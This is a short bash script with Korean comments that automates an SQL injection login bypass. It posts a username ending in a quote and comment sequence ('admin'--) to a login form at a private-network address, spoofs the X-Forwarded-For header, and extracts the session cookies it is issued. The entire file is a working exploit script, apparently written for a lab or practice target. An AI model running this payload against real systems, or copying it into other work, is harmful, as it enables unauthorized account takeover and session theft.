#!/bin/bash
# SQL Injection 로그인 우회 스크립트
# 사용법: ./sqli-login.sh [username]

TARGET="http://192.168.0.28:3000"
MY_IP="10.0.0.101"
USERNAME="${1:-admin}"

echo "[*] SQL Injection 로그인 우회 테스트"
echo "[*] 타겟: $TARGET"
echo "[*] 사용자: $USERNAME"
echo ""

# SQL Injection 페이로드로 로그인
RESPONSE=$(curl -s -v -X POST \
    -H "X-Forwarded-For: $MY_IP" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=${USERNAME}'--&password=anything" \
    "$TARGET/login" 2>&1)

# 쿠키 추출
if echo "$RESPONSE" | grep -q "Set-Cookie: user="; then
    echo "[+] SQL Injection 성공!"
    echo ""
    echo "[*] 설정된 쿠키:"
    echo "$RESPONSE" | grep "Set-Cookie:" | sed 's/< //'
    echo ""

    # 쿠키 저장
    COOKIES=$(echo "$RESPONSE" | grep "Set-Cookie:" | sed 's/< Set-Cookie: //' | cut -d';' -f1 | tr '\n' '; ')
    echo "[*] 쿠키 문자열: $COOKIES"
else
    echo "[-] 로그인 실패"
    echo "$RESPONSE" | tail -20
fi
